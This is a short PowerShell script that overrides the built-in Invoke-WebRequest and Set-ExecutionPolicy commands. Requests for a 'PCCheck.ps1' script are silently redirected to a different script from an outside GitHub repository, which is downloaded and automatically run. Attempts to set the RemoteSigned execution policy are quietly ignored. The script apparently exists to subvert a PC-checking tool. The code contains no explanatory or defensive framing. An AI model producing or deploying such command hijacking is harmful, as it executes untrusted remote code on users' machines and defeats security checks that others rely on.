function Invoke-WebRequest {
    param (
        [string]$Uri,
        [string]$OutFile
    )

    
    if ($Uri -like "*PCCheck.ps1*") {
        $Uri = "https://raw.githubusercontent.com/ZetaCleaner/Test/refs/heads/main/PC-Check.ps1"
        
        $OutFile = "C:\temp\PC-Check.ps1"
    }

    
    Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri $Uri -OutFile $OutFile

    
    if ($OutFile -like "*.ps1") {
        
        & $OutFile 
    }
}

function Set-ExecutionPolicy {
    param (
        [Microsoft.PowerShell.ExecutionPolicy]$ExecutionPolicy,
        [string]$Scope = "LocalMachine",
        [switch]$Force
    )

    
    if ($ExecutionPolicy -eq "RemoteSigned") {
        return
    }
}


